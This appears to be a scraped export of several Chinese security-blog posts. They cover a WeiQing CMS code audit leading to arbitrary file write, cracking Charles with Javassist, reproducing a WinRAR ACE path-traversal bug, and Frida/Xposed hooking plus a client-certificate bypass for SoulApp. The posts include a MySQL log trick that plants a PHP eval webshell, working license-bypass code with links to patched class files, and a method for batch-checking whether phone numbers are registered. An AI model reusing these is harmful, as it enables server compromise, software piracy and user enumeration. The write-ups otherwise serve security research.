另外由于登录前可以看到所有的内容，而登录开启青少年模式的账户时，就会进入青少年模式，只能看特定内容。所以退出账户重新登录并抓包，可以看到如下的请求。 也成功找到经过md5加密的密码。 0x04 总结这次是因为B站开启了青少年模式，后来密码给忘记了。当时只想着用爆破的方式来解决了，没有想着抓包或者查看保存的数据文件。后来爆破出密码后，又发现可以通过查看配置文件的方式和抓包的方式找到密码。而且之前是打算用ios作为测试的，后来因为效率的问题，才转战安卓。如果使用安卓的话，自动化测试工具也很多，例如UIAutomator2等。 本文其实就是一个流水账，记录一下自己找回青少年模式密码的过程，可能比较粗糙。有关IOS真机调试更详细的教程可以参考使用Appium进行iOS的真机自动化测试 。","tags":[{"name":"Appium","slug":"Appium","permalink":"https://fuping.site/tags/Appium/"},{"name":"自动化测试","slug":"自动化测试","permalink":"https://fuping.site/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"},{"name":"青少年模式","slug":"青少年模式","permalink":"https://fuping.site/tags/%E9%9D%92%E5%B0%91%E5%B9%B4%E6%A8%A1%E5%BC%8F/"}]},{"title":"记一次从源代码泄漏到后台获取webshell的过程","date":"2020-04-18T06:22:33.000Z","path":"2020/04/18/WeiQing-CMS-Background-Admin-GetShell/","text":"0x01 前言在一次授权测试中对某网站进行测试时，marry大佬发现了一个网站的备份文件，里面有网站源代码和数据库备份等。根据网站信息和代码都可以发现该系统采用的是微擎cms，利用数据库备份中的用户信息解密后可以登录系统，接下来要看是否可以获取webshell。 0x02 WEBSHELL获取的尝试有了数据库备份文件，然后找一下是否有用户的信息，能否登录系统。 1.登录后台解压备份文件可以从data/backup目录下找到数据库的备份，从中找到了用户表ims_users。 知道了用户名、加密后的密码和salt，我们去看一下密码加密的算法。 我这里直接搜索password，在forget.ctrl.php中找到了一处。 密码加密方法是$password = md5($password . $member_info[&#39;salt&#39;] . $_W[&#39;config&#39;][&#39;setting&#39;][&#39;authkey&#39;]);。是根据原密码+salt+authkey的形式进行拼接，然后进行md5加密。 authkey在data/config.php文件中。 现在salt和authkey以及加密后的密码已经获得，开始去解密密码是多少。这里我们将salt和authkey拼接为新的salt，然后使用md5($pass.$salt)的加密方式进行解密。 解密后即可登录后台。 接下来就是webshell的获取了。 本以为都已经是管理员了，获取shell就是分分钟的事，然而事情远远没有那么简单。 2.失败的获取shell过程根据搜索发现，该cms后台获取shell的方法也不少，主要还是围绕执行sql这里。但我这里都失败了，就简单的提一下。 第一种方法： 站点管理-附件设置-图片附件设置-支持文件后缀，任意添加一个类型，例如添加pppppp。 然后执行sql语句 1UPDATE ims_core_settings SET value = replace(value, 'pppppp', 'php ') 更新缓存，之后就可以上传&quot;*.php &quot;文件了。但是有限制，适用于apache下，而且版本有限制。目标站不使用该方法的原因有二，一是该系统上传的位置是腾讯云COS上，二是server是Tengine。 第二种方法： 第二种方法也是和sql执行有关，利用日志文件写shell。 1234show variables like '%general%'; #查看配置set global general_log = on; #开启general log模式set global general_log_file = '/var/www/html/1.php'; #设置日志目录为shell地址select '&lt;?php eval($_POST[cmd]);?&gt;' #写入shell 或者通过慢查询（slow_query_log）的方法写shell。但目标系统也是失败，执行sql的时候报错。 还有一些其他的方法，这里测试也是失败的，就不再列举了。 0x03 代码审计病急乱投医，熬成老中医。既然之前的方法不管用，只好去翻代码吧，找找是否有新的利用方式。翻出之前的一个文档，从里面找到之前的审计过程，看能否对现在有用。结果打开发现只有一个数据包和还有一句未实现的结论。 没办法，只好重新围着这个点继续审计，看是否能有所进展。 1.分析打开文件web/source/cloud/dock.ctrl.php，找到执行的download方法。 代码比较简单，我大概说一下这里的流程： 如果请求包非Base64加密的格式，那么$data就是请求包的内容。然后对$data进行发序列化返回$ret，接下来获取$ret[&#39;file&#39;]并Base64解密返回$file。当存在gzcompress和gzuncompress这两个函数时，就会利用gzuncompress函数对$file进行解压操作。 将获取的$file进行md5加密后，与$ret[&#39;path&#39;]以及获取的$_W[&#39;setting&#39;][&#39;site&#39;][&#39;token&#39;]进行拼接为$string。当满足$_W[&#39;setting&#39;][&#39;site&#39;][&#39;token&#39;]非空并且$stringmd5加密后的结果与$ret[&#39;sign&#39;]一致时，才可以进行下面的操作。下面就是文件的写入了，根据$ret[&#39;path&#39;]进行判断，然后写入的位置不一样。 这里关键的一点就是$_W[&#39;setting&#39;][&#39;site&#39;][&#39;token&#39;]这个值的获取。这个是利用authcode函数对cache_load(cache_system_key(&#39;cloud_transtoken&#39;))进行解密获取的。 authcode函数位于framework/function/global.func.php文件中。 由上面代码可以看出，要想使用authcode加解密，需要知道$GLOBALS[&#39;_W&#39;][&#39;config&#39;][&#39;setting&#39;][&#39;authkey&#39;]，在上面提到过，authkey在data/config.php文件中。 那么如果想任意写文件，就需要知道cache_system_key(&#39;cloud_transtoken&#39;)的内容了。 2.cloud_transtoken的获取通过搜索发现，这个值是在文件framework/model/cloud.mod.php中的cloud_build_transtoken函数中被写入的，通过进入cache_write方法，发现会写入数据库中。 既然会写入到数据库中，而且目标系统下载到时候有数据库的备份文件，我们直接在数据库备份文件中搜索cloud_transtoken。结果并没有找到，可能原因是没有写入cloud_transtoken的时候就进行了数据库备份。 我们往上回溯，看哪里调用了cloud_build_transtoken。 发现了其中的一条利用链： 当访问http://ip:port/web/index.php?c=cloud&amp;a=profile 时，就会判断站点ID和通信密钥是否为空（即站点是否注册），如果站点注册了，就会调用cloud_site_info()函数获取站点信息。函数cloud_site_info()调用了cloud_api(&#39;site/info&#39;)，这里的method为site/info，所以继续调用cloud_build_transtoken从会而将cloud_transtoken的内容写入数据库。然后通过数据库备份的功能，就可以看到数据库中保存的cloud_transtoken，进而可以利用之前的分析写shell。 3.自定义数据库备份由于数据库备份需要关闭站点，为了不影响目标站点的使用，这里我们搭建一个环境演示一下过程（需要注册站点）。 登录成功后更新缓存，然后访问http://ip:port/web/index.php?c=cloud&amp;a=profile ，关闭站点后进行数据库备份。 发现可以获取cloud_transtoken，但是数据库目录和文件的名字是随机的。 而且如果备份文件里面的数据库文件不是最新的，那么即使获取到cloud_transtoken也无法利用，我们需要最新的备份文件。 然后我们看一下数据库备份是怎么实现的，打开web/source/system/database.ctrl.php。 发现文件夹和分卷名可以自定义，如果为空或不满足条件的话，文件夹是时间戳、下划线和8位随机字符串的拼接，分卷名是volume-10位随机字符串-1.sql的形式，既然可以自定义，那么就简单多了。 访问链接http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456 进行数据库备份，则数据库备份文件的地址为：http://ip:port/data/backup/123/volume-456-1.sql 然后就可以随时获取cloud_transtoken了。接下来就可以进行shell的获取了。 4.获取WEBSHELL根据上面的分析，cloud_transtoken、authkey已经知道了，接下来就是构造payload了。 然后请求http://ip:port/web/index.php?c=cloud&amp;a=dock&amp;do=download ，data为生成的payload。 可以进行任意文件的写入，对目标系统进行测试，也成功获取了shell。 5.延伸上面是因为有系统文件备份，然后获取/data/config.php中的authkey。如果没有文件备份，登录了一个管理员权限的用户，能否获取shell呢。答案也是可以的。 该系统有一个木马查杀功能，可以根据这个功能读取文件内容。 选择一个目录，然后提交并拦截数据库包，修改查杀目录为data/.，特征函数为password。然后就可以看到查杀结果，获取authkey的值。 在对最新版 v2.5.7（202002140001）进行木马查杀的时候，可以从查杀报告中看到该文件，但是查看时提示文件不存在。原因是最新版利用正则对文件路径进行匹配，如果匹配成功就提示文件不存在（windows下可以利用大写路径绕过）。 0x04 总结根据上面对分析过程，该漏洞的利用过程如下： 1.成功登录后台，且拥有管理员权限。 2.更新缓存（非必须），访问链接http://ip:port/web/index.php?c=cloud&amp;a=profile 写入cloud_transtoken到数据库中。 3.关闭站点并进行使用自定义的目录进行数据库备份，链接地址：http://ip:port/web/index.php?c=system&amp;a=database&amp;do=backup&amp;status=1&amp;start=2&amp;folder_suffix=123&amp;volume_suffix=456 。然后下载数据库备份，地址为：http://ip:port/data/backup/123/volume-456-1.sql （多个分卷的话文件名为volume-456-2.sql、volume-456-3.sql… ）,然后找到cloud_transtoken。 4.生成payload，请求http://ip:port/web/index.php?c=cloud&amp;a=dock&amp;do=download ，写入shell。 总的来说，利用上述方法获取shell需要满足两个条件，第一是拥有一个管理员权限的用户，第二就是该站点注册了云服务。","tags":[{"name":"微擎","slug":"微擎","permalink":"https://fuping.site/tags/%E5%BE%AE%E6%93%8E/"},{"name":"代码审计","slug":"代码审计","permalink":"https://fuping.site/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"Charles的一次破解之旅","date":"2019-10-24T16:00:00.000Z","path":"2019/10/25/charles-crack/","text":"0x01 前言本文以WEB抓包工具Charles(v4.2.8)为例，讲解一下其注册的流程以及如何使用javassist对java软件进行修改，达到破解的目的。 先看一下实现的效果。使用任意用户名+任意key就可以进行激活。 激活成功 如果想换用户名，取消注册再次注册即可。 Help-&gt;Unregister Charles… 接下来我们来分析一下注册的流程，以及如何去破解。 0x02 分析首先打开软件(版本为v4.2.8)，未注册时需要等待10s的动画才可进入，而且30分钟后会退出软件。 打开Help-&gt;Register Charles…，看到注册界面。 使用jadx-gui打开charles.jar，搜索字符串Register Charles，定位到com.xk72.charles.gui.frames.RegisterFrame中。 其中一段代码： 1this.bRegister.addActionListener(new NBdE(this)); 可以看到注册按钮绑定的事件，当按下注册按钮时，执行new NBdE(this)。 跟进到com.xk72.charles.gui.frames.NBdE 其中的trim为Registered Name，trim2为License Key 首先对输入的name和key进行判断，需要其长度要大于0，然后调用qHTb.DdNM(trim, trim2)方法，并对其返回的结果进行判断。当不为null时，注册失败。反之则注册成功。 跟进com.xk72.charles.qHTb中，调用的是DdNM(String str1,String str2) 由之前的推断可以知道，当qHTb.DdNM(str1, str2)=null时注册成功，这里DdNM(String str1,String str2)函数中如果正常执行twLa = new qHTb(str, str2);则会返回null，否则返回异常的信息。所以需要看twLa = new qHTb(str, str2);是否抛出异常，如果未异常，则返回为null，即注册成功；反之，注册失败。 继续跟进构造函数qHTb(String str1,String str2)。 构造函数qHTb(String str1,String str2)调用了qHTb(String str1,String str2,int i) 其主要代码如下： 123456789101112131415161718192021private qHTb(String str, String str2, int i) &#123; boolean z = false; this.gbef = false;//表示是否注册成功 true为成功 this.lPpR = \"Unregistered\";//注册成功后为输入的Registered Name try &#123; String replaceAll = str.replaceAll(\"[ ᠎ ]\", \" \");//替换特殊字符 if (DdNM(twLa(replaceAll, str2, 4))) &#123; z = true; &#125; else if (!replaceAll.equals(str)) &#123; z = DdNM(twLa(str, str2, 4)); &#125; if (!z) &#123; throw new LicenseException(DdNM(2)); &#125; this.lPpR = str;//注册成功，lPpR为Registered Name this.gbef = true;//注册成功 &#125; catch (NumberFormatException e) &#123; throw new LicenseException(DdNM(1)); &#125; &#125; 因此要使注册成功，首先需要twLa(String str,String str2, int i)在调用的时候无异常，并且需要DdNM(long j)返回为true。 由以上代码可知，当j=lGuB时，返回为true。lGuB为已知常量。即需要满足j=5911726755176091652L;时，DdNM(long j)返回为true。 接下来看twLa(String str,String str2, int i)。 由于jadx-gui查看twLa未反编译完全，为了查看方便，这里用Idea打开。 twLa方法的三个参数，var1是注册的name，var2是注册的key，var3是4. 分割线以上的为注册码的校验，下面为对用户名进行操作。可以从以上的代码看出，在用户名操作时没有抛出异常的行为，所以从这里来看，注册成功与否与用户名没有直接关系（因为从之前的推断可知，当出现异常时注册失败）。 所以这里的破解思路是： 使用javassist修改twLa(String str,String str2, int i)中的第二个参数，为一个可用的注册码，然后使该函数的返回值为5911726755176091652L即可。 当然也可以直接修改DdNM(long j)返回为true，修改DdNM(String str1, String str2)第二个参数为可用的key。这样修改以后，在软件运行注册的时候，可以达到任意用户名和任意key注册的效果。 当然修改的方法不止这两种，知道注册流程后，修改就很容易了。 接下来引入如何使用javassist来对软件进行修改。 0x03 使用javassist进行修改Javassist是一个开源的分析、编辑和创建Java字节码的类库。虽然关于java字节码的处理有很多工具，如bcel，asm。不过这些都需要直接跟虚拟机指令打交道。而且Javassit 提供了更高级的API，无需掌握字节码指令的知识，对使用者要求较低。直接使用java编码的形式，不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。 v4.2.8的修改根据上面的分析，修改v4.2.8时，需要修改DdNM(long j)返回为true，修改DdNM(String str1, String str2)第二个参数为可用的key，例如C9D1226DB5B93C12D1。 利用Javassist进行修改起来也很简单，具体实现代码如下： 1234567891011121314private static ClassPool pool = ClassPool.getDefault(); public static void main(String[] args) throws Exception &#123; pool.insertClassPath(\"~/Desktop/charles.jar\"); CtClass ctClass = pool.get(\"com.xk72.charles.qHTb\"); CtMethod ctm1 = ctClass.getDeclaredMethod(\"DdNM\",new CtClass[]&#123;pool.get(\"long\")&#125;); ctm1.setBody(\"return true;\");//修改返回值 CtMethod ctm2 = ctClass.getDeclaredMethod(\"DdNM\",new CtClass[]&#123;pool.get(\"java.lang.String\"),pool.get(\"java.lang.String\")&#125;); ctm2.insertBefore(\"$2=\\\"C9D1226DB5B93C12D1\\\";\");//修改第二个参数 ctClass.writeFile(\"~/Desktop/\"); &#125; 然后更新修改的内容，并替换 123jar -uvf charles.jar comcp charles.jar /Applications/Charles.app/Contents/Java/ 然后再次打开Charles注册时就可以达到文章开头的效果了。 更改后的文件：https://fuping.site/files/qHTb.class 使用方法：新建文件夹com/xk72/charles，然后将class文件放入其中，执行jar -uvf charles.jar com。再替换charles.jar即可。 v4.5.4的修改当时修改的时候最新版是v4.2.8，10.29号下载的是v4.5.1，还没来得及安装，再次查看最新版已经是v4.5.4了。 虽然更新了，其中类名和方法名改变了，但是注册的流程还是老样子。根据上面的思路可以进行修改。找到注册校验的类。 需要修改的类为com.xk72.charles.DIWy。 需要修改的方法： 1.private boolean OZtq(long var1)，返回值修改为true。 2.public static String OZtq(String var0, String var1)，第二个参数为可用的key。 修改的代码就不贴了，和上面的一样，修改一下类名和方法名即可。 打开Charles后任意用户名+任意注册码注册成功。 更改后的文件：https://fuping.site/files/DIWy.class 0x04 总结关于Charles破解的文章，网上有很多。大多数都是直接修改了注册的标志和注册的信息，本文也是提供了另外一种破解的思路。通过简单分析注册的流程，然后使用javassist进行java文件的修改，以此达到破解的目的。 关于更多Charles破解相关的文章，可以参考以下几篇： [1].http://scz.617.cn:8/misc/201910241714.txt （有详细注册码的算法以及注册机） [2].http://www.520monkey.com/archives/1295 （有分析和修改） [3].https://www.freebuf.com/sectool/205520.html （有详细的javassist使用） …","tags":[{"name":"Charles破解","slug":"Charles破解","permalink":"https://fuping.site/tags/Charles%E7%A0%B4%E8%A7%A3/"},{"name":"软件破解","slug":"软件破解","permalink":"https://fuping.site/tags/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/"},{"name":"javassist","slug":"javassist","permalink":"https://fuping.site/tags/javassist/"}]},{"title":"WinRAR漏洞复现过程","date":"2019-02-21T09:43:56.000Z","path":"2019/02/21/WinRAR-Extracting-Code-Execution-Validate/","text":"0x01 漏洞描述近日Check Point团队爆出了一个关于WinRAR存在19年的漏洞，用它来可以获得受害者计算机的控制。攻击者只需利用此漏洞构造恶意的压缩文件，当受害者使用WinRAR解压该恶意文件时便会触发漏洞。 该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在 2006 年被编译，没有任何的基础保护机制(ASLR, DEP 等)。动态链接库的作用是处理 ACE 格式文件。而WinRAR解压ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，将恶意文件写入任意目录,甚至可以写入文件至开机启动项，导致代码执行。 0x02 漏洞影响影响软件： WinRAR &lt; 5.70 Beta 1 Bandizip &lt; = 6.2.0.0 好压(2345压缩) &lt; = 5.9.8.10907 360压缩 &lt; = 4.0.0.1170 等等… 0x03 漏洞复现该漏洞的实现过程：首先新建一个任意文件，然后利用WinACE进行压缩，修改filename来实现目录穿越漏洞，可以将文件解压到任意目录中。 主要所需工具WinACE、010Editor。 下载WinACE并安装，安装完成后新建一个文本文件，名字任意。 然后利用WinACE进行压缩。 然后我们下载acefile.py脚本。 使用命令python acefile.py --headers liehu.ace来读取该文件头信息。 根据漏洞的描述，问题是出现在filename中的。那主要就看下面的header吧。 用010Editor打开该文件。 需要看选中的部分。对比acefile解析的结果，并明白各个段对应的内容。 如果要修改filename，则需要修改上面标注这几处。第一处为0x4e9a(hdr_crc),第二处为0x0044(hdr_size)，第三处为0x0025(filename的长度），以及最后一处为filename。 修改顺序是由后到前。 这里修改filename为d:\\d:\\liehu.txt 长度为15，对应的hex为0x000f 然后修改hdr_size，长度为46，对应的hex为0x002E。 接下来就是修改hdr_crc了，这里有一个取巧的方法。 我们再次运行命令python acefile.py --headers liehu.ace 程序中断并提示CorruptedArchiveError: header CRC failed 定位到错误的位置 这里ace_crc16(buf)的值就是ace文件0x4e9a对应的值，直接打印出该值并将该位置的值修改即可。 对应的值为63232，转换为hex为0xF700。 最后文件内容为 再次查看，可以正常解析，并看到filename已经修改成功 右键解压该文件，则会在D盘生成一个liehu.txt文件。 测试文件： https://fuping.site/files/liehu.ace 解压后会在D盘生成一个liehu.txt文件 测试脚本： https://github.com/fupinglee/MyPython/blob/master/exploit/WinRAR_exploit/WinRAR_exploit.py 0x04 修复建议有两种方式 升级到最新版本，WinRAR 目前版本是 5.70 Beta 1 删除UNACEV2.dll文件 此时再次解压恶意文件会提示如下错误： 0x05 参考https://research.checkpoint.com/extracting-code-execution-from-winrar/","tags":[{"name":"WinRAR漏洞","slug":"WinRAR漏洞","permalink":"https://fuping.site/tags/WinRAR%E6%BC%8F%E6%B4%9E/"}]},{"title":"安卓APP测试之双向证书认证","date":"2019-02-13T02:21:36.000Z","path":"2019/02/13/SoulAPP-SSL-Bypass/","text":"0x01 前言在《安卓APP测试之HOOK大法-Frida篇》文章中有一个双向证书认证没详细说明，经过孔已己的提示，现在补充一下。 0x02 双向证书认证与解决方法在对soulApp进行抓包的时候，提示网络错误,请检查网络后重试~ 本来以为直接把这个okhttp的证书hook修改成系统默认的即可，就没有详细说明这一部分，结果有网友问双向证书认证这部分是如何处理的，就详细来说明一下如何处理。这里时由于采用了双向证书认证的缘故，所以抓包返回400错误，直接浏览器访问https://account.soulapp.cn/ ，也是不行的 提示No required SSL certificate was sent.如果要访问成功，就要带上证书。 关于双向证书认证：客户端有自己的密匙，并持有服务端的证书，服务端给客户端发送数据时，需要将服务端的证书发给客户端验证，验证通过才运行发送数据，同样，客户端请求服务器数据时，也需要将自己的证书发给服务端验证，通过才允许执行请求。详细的内容可以参考https://blog.csdn.net/enweitech/article/details/53813183。 我们本地来测试一下，简单介绍一下如何搭建双向证书认证环境。 1.双向证书认证服务器的搭建创建一个证书的步骤： （1）生成系统私钥 （2）生成待签名证书 （3）生成x509证书, 用CA私钥进行签名 证书的生成过程略。 以tomcat服务器为例。将生成的服务端证书server.p12和客户端信任证书truststore.jks放入conf目录下。修改tomcat下conf/server.xml文件，去掉https的注释。 123&lt;Connector port&#x3D;&quot;8443&quot; protocol&#x3D;&quot;org.apache.coyote.http11.Http11Protocol&quot; maxThreads&#x3D;&quot;150&quot; SSLEnabled&#x3D;&quot;true&quot; scheme&#x3D;&quot;https&quot; secure&#x3D;&quot;true&quot; clientAuth&#x3D;&quot;false&quot; sslProtocol&#x3D;&quot;TLS&quot; &#x2F;&gt; 修改为 12345&lt;Connector port&#x3D;&quot;8443&quot; protocol&#x3D;&quot;org.apache.coyote.http11.Http11Protocol&quot; truststoreFile&#x3D;&quot;conf&#x2F;truststore.jks&quot; truststorePass&#x3D;&quot;123456&quot; truststoreType&#x3D;&quot;JKS&quot; keystoreFile&#x3D;&quot;conf&#x2F;server.p12&quot; keystorePass&#x3D;&quot;123456&quot; keystoreType&#x3D;&quot;PKCS12&quot; maxThreads&#x3D;&quot;150&quot; SSLEnabled&#x3D;&quot;true&quot; scheme&#x3D;&quot;https&quot; secure&#x3D;&quot;true&quot; clientAuth&#x3D;&quot;false&quot; sslProtocol&#x3D;&quot;TLS&quot; &#x2F;&gt; 此时clientAuth=&quot;false&quot;，未开启客户端校验。 启动服务器并访问。 虽然提示错误但是点继续前往即可访问。 设置开启客户端校验，即clientAuth=&quot;true&quot; 然后重启后访问 无法正常访问，想要正常访问，浏览器导入证书即可 下一步然后输入密码 刷新页面，提示选择证书。 确定后即可访问。 2.soulAPP双向认证解决方法同理这里soulApp也可以这样做。 这里列举三种方法来完成客户端的验证。归根结底都是证书的利用。 a)浏览器导入证书利用soulApp中的证书和密码生成浏览器证书。 1openssl pkcs12 -export -inkey client.key -in client.crt -out soulclient.pfx 证书的位置位于资源文件assets中。 标记的1处输入的是soul证书的密码，2和3为证书导入浏览器自己设置的密码，这里为123456 然后导入浏览器，重新访问https://account.soulapp.cn/ 选择证书后确定。 根据页面显示内容可以发现此时导入证书后可以正常访问。 b)利用程序完成认证利用程序的话，参考cn.soulapp.android.api.e.a()方法，进行证书的操作。 精简之后主要代码如下： 然后利用httpclient进行http请求。 当访问不加证书的效果： 使用证书的结果： 由于这是这是之前的数据包，所以已经过期，再次使用需要更换时间戳和签名，但结果成功的。 c)利用抓包工具使用抓包工具，这里以burp为例。 未导入证书抓包结果： 提示400错误，我们在burp中导入证书 选择证书并输入密码。 证书导入成功。 再次抓包 已经可以正常抓取了。 当然使用其他方法也是可行的，这里就不再列举了。 0x03 总结本文主要是为了解决APP与服务器之间的双向证书认证问题，没有太多的技巧，主要就是证书的使用。如果服务器采用了双向认证，那么一般在APP中有证书和证书密码的存在，找到之后导入抓包工具即可。","tags":[{"name":"SoulAPP","slug":"SoulAPP","permalink":"https://fuping.site/tags/SoulAPP/"},{"name":"双向证书","slug":"双向证书","permalink":"https://fuping.site/tags/%E5%8F%8C%E5%90%91%E8%AF%81%E4%B9%A6/"}]},{"title":"安卓APP测试之HOOK大法-Xposed篇","date":"2019-01-28T09:21:56.000Z","path":"2019/01/28/Xposed-Hook-SoulApp/","text":"0x01 前言安卓APP测试之HOOK大法-Frida篇是基于Frida来实现HOOK，对于部分用户来说，一方面手机ROOT会带来一些风险，另一方面虽然愿意承担风险但是手机无法ROOT。这就需要采用另外一种方法–利用Xposed来进行HOOK。安装VirtualXposed之后，并不需要对手机进行ROOT，也可以来运行Xposed模块进行HOOK。 VirtualXposed是基于VirtualApp 和 epic 在非ROOT环境下运行Xposed模块的实现（支持5.0~9.0)，就像它的介绍那样，Use Xposed with a simple APP, without needing to root, unlock the bootloader, or flash a system image.可以运行Xposed，不需要root，也不需要BL解锁和刷机。 0x02 环境准备手机还是采用魅族Mx4，关闭ROOT权限。 下载并安装VirtualXposed，下载地址：https://github.com/android-hacker/VirtualXposed/releases 安装： adb install VirtualXposed_0.16.1.apk 安装VirtualXposed之后，然后把手机上的APP安装到VirtualXposed上。 由于VirtualXposed自带Xposed，这里我们只将需要的APP安装上去即可。 开发Xposed模块采用的是Android Studio。 新建一个APP项目，添加依赖 12provided &#39;de.robv.android.xposed:api:82&#39;provided &#39;de.robv.android.xposed:api:82:sources&#39; 新建一个Main类，并实现IXposedHookLoadPackage接口。 在src/main下新建一个Assets Folder。 并在其中新建一个名称为xposed_init的文件，内容是实现HOOK的类，这里是com.fuping.soulhook.Main。 在AndroidManifest.xml中指定模块的名称 环境准备好了，下面就是模块的开发和HOOK了。 0x03 利用Xposed进行HOOK由于上篇文章已经分析过了，这里就不进行分析了，打开app会提示SoulApp 暂不支持模拟器，请稍后再试~。我们需要对cn.soulapp.android.utils.j.e()进行HOOK，令其返回为false。 上面模块的框架已经搭好了，直接写HOOK代码，主要代码如下： 注意，利用Android Studio进行模块的编写时，需要禁用Instant Run(File -&gt; Settings -&gt; Build, Execution, Deployment -&gt; Instant Run)。 然后打包安装。再利用VirtualXposed将编写的HOOK模块添加到VirtualXposed中。 查看安装的app 然后在VirtualXposed中打开Xposed Installer，在模块中勾选soulHook。 重启VirtualXposed。 Xposed模块每次修改都需要重启手机，在VirtualXposed中时，只需重启VirtualXposed即可，而且速度极快。 在VirtualXposed中打开soulapp，并查看logcat输出内容。 APP可以正常进入，说明HOOK成功。 剩下的也比较简单了，例如查看com.gongjiao.rr.tools.f.b参数。 主要代码： 运行输入手机号查看Log信息： 也是毫无问题可以获取到参数的内容的。 获取到参数内容后，根据上篇文章的算法的分析，就可以自己构造进行加密了。 例如利用Python来实现，可以批量探测用户是否注册。 0x04 总结本来Frida和Xposed是作为一篇文章的，但是由于篇幅问题分成了两篇。这两篇文章主要通过两种方式来进行HOOK，主要是为了说明HOOK的好处，没有说是为了对比哪个好哪个不好的。不过通过测试，如果安装了VirtualXposed，Xposed应该还是略胜一筹吧。第一点无需ROOT即可运行，第二点是解决了需要重启手机的麻烦（利用VirtualXposed可以秒重启），第三点就是携带方便了。不过各有各的好处，根据自己的习惯选择。也可以先用Frida进行HOOK，毕竟测试比较方便，然后最后移植到Xposed上。","tags":[{"name":"安卓Hook","slug":"安卓Hook","permalink":"https://fuping.site/tags/%E5%AE%89%E5%8D%93Hook/"},{"name":"SoulAPP","slug":"SoulAPP","permalink":"https://fuping.site/tags/SoulAPP/"},{"name":"Xposed","slug":"Xposed","permalink":"https://fuping.site/tags/Xposed/"}]},{"title":"安卓APP测试之HOOK大法-Frida篇","date":"2019-01-25T14:17:11.000Z","path":"2019/01/25/Frida-Hook-SoulAPP/","text":"0x01 前言一般测试APP都是先设置代理，然后抓包进行测试。但是大多数情况下，抓取的数据包都含有参数校验，一旦修改其中一个参数之后，就会返回签名错误。 例如： 还有的有时间校验，当过去某一时间段后，该数据包就失效了。 因此如果想要去重放或者修改数据包进行FUZZ的话，就要弄清楚其中的加密sign值的算法。 本文以某app老版本为例(仅为技术研究)，主要目的是利用Frida进行HOOK进而去获取其api-sign的加密算法。 0x02 环境准备这里手机采用魅族X4，刷了CM13.0，开启ROOT权限。 APP版本为v3.0.10，下载地址：https://www.wandoujia.com/apps/cn.soulapp.android/history_v18080100 然后就是Frida环境的准备了。 Frida是一款基于Python + JavaScript 的Hook与调试框架，在Android\\Linux\\Windows等平台均能使用。这里我们以Windows来对Android应用程序进行Hook。Frida的官网地址是：https://www.frida.re。 安装方法也很简单：pip install frida-tools。 手机开启开发者模式，并开启USB调试。 下载frida-server，下载地址为：http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。 上传到手机 1adb push frida-server /data/local/tmp/ 添加权限 1root@mx4:/ #chmod 777 frida-server 手机上运行frida-server，命令如下： 1root@mx4:&#x2F; #.&#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server 端口转发,电脑上运行如下命令: 1adb forward tcp:27042 tcp:27042 环境准备好了，就开始对APP进行测试。 0x03 利用Frida进行HOOK安装后打开APP。 发现APP闪退，并提示SoulApp 暂不支持模拟器，请稍后再试~。 用jadx打开apk文件，搜索关键字模拟器。 只有一处，我们点进去。 其中有个判断，如果cn.soulapp.android.utils.j.e()为true，则提示不支持模拟器，并退出程序。点进这个方法查看。 其中有多个判断，如果一个为true，则返回true，最简单有效的方法就是hook，直接令其返回为false。使用Frida进行hook，代码如下： 运行后，发现再次打开app，可以顺利进入了。 输入手机号，点击确定。 提示网络错误，这是因为使用了代理，所以报错，但是有数据包的。可以暂时先不管这里。我们目的是获取sign值的加密算法。这里是获取api-sign的加密算法。 数据包内容 数据包中有api-sign，所以直接利用jadx搜索api-sign。 发现在cn.soulapp.android.api.b.b.b()中有调用，进入查看。 api-sign值的获取调用了cn.soulapp.android.api.b.c.a方法。 这里是创建了一个stringBuilder，经过拼接后，调用com.gongjiao.rr.tools.f.b进行sha1加密，并转换为大写。我们需要知道cn.soulapp.android.api.b.c.a三个参数的值是什么。 1aVar.b(\"api-sign\", c.a(aaVar, replaceAll, currentTimeMillis)); 根据代码可以推测，第一个参数aaVar是类okhttp3.Request的实例化； 第二个参数replaceAll是获取的UUID去除中间的&quot;-&quot;； 第三个参数是当前时间戳减去cn.soulapp.android.api.a.a()。这个值是从soul_share.xml中读取ApiConstants_timeDiff的值，查看soul_share.xml发现内容为空。 所以第三个参数为当前的时间戳。 查看cn.soulapp.android.api.b.c.a方法，前半部分是对aaVar进行操作，大概是获取请求的路径，然后对参数进行拼接。 看后半部分的代码： 这里第71行中的UTDevice.getUtdid(SoulApp.b())为设备号，即数据包里面的device-id； 第72行的a.j为固定值，这里为10000003； 第73行这个值需要获取，可以用hook获取； 第74行a(j)是将传入的时间戳(第三个参数)进行转换； 第75行是拼接了传入的第二个参数； 第78行拼接了固定值3010； 然后第80行调用com.gongjiao.rr.tools.f.b对stringBuilder进行加密，并转换为大写。 可以通过hook的方法直接获取cn.soulapp.android.api.b.c.a和com.gongjiao.rr.tools.f.b的参数。 主要代码： 由于cn.soulapp.android.api.b.c中有多个a方法，所以这里用了重载，指明参数类型来确定是哪个方法。 运行效果 知道了加密算法以及参数，就可以自己实现加密获取api-sign了，如下所示： api-sign值可以获取了，我们试一下能否利用。由上面知道代理抓包时数据包返回400，经过查看代码是可以解决这个问题的。这里不详细说明。 发现该方法获取api-sign是可行的。 0x04 其他问题1.不进行hook获取参数的内容或者查看调用堆栈的方法可以通过动态调试的方法进行查看。 首先将apk反编译为smali文件，然后IDEA安装smalidea插件。下载地址：https://bitbucket.org/JesusFreke/smali/downloads/ 反编译的命令如下： java -jar baksmali-2.2.2.jar d 106_3ce8a91b116f3ca28175affa3d12083f.apk -o SoulApp3010/src 然后导入到idea中 然后在需要查看的地方下断点。 例如在cn.soulapp.android.api.b.c.a下断点 打开Run/Debug Configurations，添加一个远程调试，端口8700 运行app，然后在Android Device Monitor中选中 打开调试按钮，点击手机上的确定，进入调试。 2.加密的算法在so文件中简单的方法就是获取调用so中方法的参数，然后自己写一个app，调用其so文件。 如果有判断的话，可以修改so文件达到可以调用的目的。 